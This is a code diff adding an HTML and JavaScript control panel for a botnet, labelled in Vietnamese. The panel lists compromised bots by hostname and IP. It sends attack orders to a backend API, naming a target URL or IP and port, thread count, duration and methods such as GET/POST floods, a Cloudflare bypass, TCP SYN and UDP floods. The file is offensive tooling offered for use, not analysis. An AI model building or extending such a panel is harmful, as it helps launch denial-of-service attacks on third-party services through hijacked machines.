@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Botnet Panel</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#fff;font-family:Arial}
+        .header{background:#111;padding:15px;border-bottom:2px solid red}
+        .main{display:flex;height:calc(100vh - 60px)}
+        .sidebar{width:250px;background:#111;padding:15px;overflow-y:auto}
+        .content{flex:1;padding:20px}
+        .bot-item{background:#1a1a1a;padding:10px;margin:5px 0;border-radius:5px;cursor:pointer}
+        .bot-item:hover{background:#222}
+        .bot-item.online{border-left:3px solid #0f0}
+        .bot-item.offline{border-left:3px solid #555}
+        .bot-item.attacking{border-left:3px solid #f00}
+        input,select,button{padding:10px;margin:5px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:3px}
+        button{background:#c0392b;cursor:pointer;border:none;font-weight:bold}
+        button:hover{background:#e74c3c}
+        button.stop{background:#27ae60}
+        button.stop:hover{background:#2ecc71}
+        .log{background:#111;padding:10px;height:300px;overflow-y:auto;margin-top:10px;font-family:monospace;font-size:12px}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>☠️ BOTNET PANEL</h1>
+        <span id="botCount">Bot: 0</span>
+    </div>
+    <div class="main">
+        <div class="sidebar">
+            <h3>🤖 DANH SÁCH BOT</h3>
+            <button onclick="selectAll()">CHỌN TẤT CẢ</button>
+            <div id="botList"></div>
+        </div>
+        <div class="content">
+            <h2>⚔️ TẤN CÔNG</h2>
+            <select id="layer">
+                <option value="L7">Layer 7 - HTTP</option>
+                <option value="L4">Layer 4 - TCP/UDP</option>
+            </select>
+            <select id="method">
+                <option value="GET_FLOOD">GET Flood</option>
+                <option value="POST_FLOOD">POST Flood</option>
+                <option value="CF_BYPASS">CF Bypass</option>
+                <option value="TCP_SYN">TCP SYN</option>
+                <option value="UDP_FLOOD">UDP Flood</option>
+            </select><br>
+            <input type="text" id="target" placeholder="Mục tiêu (URL hoặc IP:Port)" style="width:400px">
+            <input type="number" id="threads" placeholder="Số luồng" value="100">
+            <input type="number" id="duration" placeholder="Thời gian (s)" value="60"><br>
+            <button onclick="attack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
+            <button onclick="attack('SELECTED')">🎯 TẤN CÔNG BOT ĐÃ CHỌN</button>
+            <button class="stop" onclick="stop('ALL')">⏹ DỪNG TẤT CẢ</button>
+            <div class="log" id="log">[HỆ THỐNG] Đang kết nối server...</div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let bots = {};
+        let selectedBot = null;
+
+        socket.on('connect', () => {
+            document.getElementById('log').innerHTML += '<br>[OK] Kết nối server thành công!';
+        });
+
+        socket.on('bot_list', (data) => {
+            bots = data;
+            updateBotList();
+        });
+
+        socket.on('attack_log', (data) => {
+            document.getElementById('log').innerHTML += '<br>[' + new Date().toLocaleTimeString() + '] ' + JSON.stringify(data);
+        });
+
+        function updateBotList() {
+            let html = '';
+            let count = 0;
+            for (let id in bots) {
+                let b = bots[id];
+                if (b.online) count++;
+                let cls = b.status === 'ATTACKING' ? 'attacking' : (b.online ? 'online' : 'offline');
+                html += `<div class="bot-item ${cls}" onclick="selectBot('${id}')" id="bot_${id}">
+                    <b>${b.hostname}</b><br>
+                    <small>${b.status} | ${b.ip}</small>
+                </div>`;
+            }
+            document.getElementById('botList').innerHTML = html || '<p>Chưa có bot</p>';
+            document.getElementById('botCount').innerText = 'Bot: ' + count;
+        }
+
+        function selectBot(id) {
+            selectedBot = id;
+            document.querySelectorAll('.bot-item').forEach(el => el.style.background = '#1a1a1a');
+            document.getElementById('bot_' + id).style.background = '#333';
+        }
+
+        function selectAll() {
+            selectedBot = 'ALL';
+            document.querySelectorAll('.bot-item').forEach(el => el.style.background = '#1a1a1a');
+        }
+
+        function attack(target) {
+            let botId = target === 'ALL' ? 'ALL' : selectedBot;
+            if (!botId) { alert('Chọn bot trước!'); return; }
+            
+            let data = {
+                botId: botId,
+                layer: document.getElementById('layer').value,
+                method: document.getElementById('method').value,
+                target: document.getElementById('target').value,
+                threads: document.getElementById('threads').value,
+                duration: document.getElementById('duration').value
+            };
+            
+            fetch('/api/attack', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            
+            document.getElementById('log').innerHTML += '<br>[LỆNH] Gửi tấn công: ' + JSON.stringify(data);
+        }
+
+        function stop(target) {
+            fetch('/api/stop', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({botId: target === 'ALL' ? 'ALL' : selectedBot})
+            });
+        }
+    </script>
+</body>
+</html>
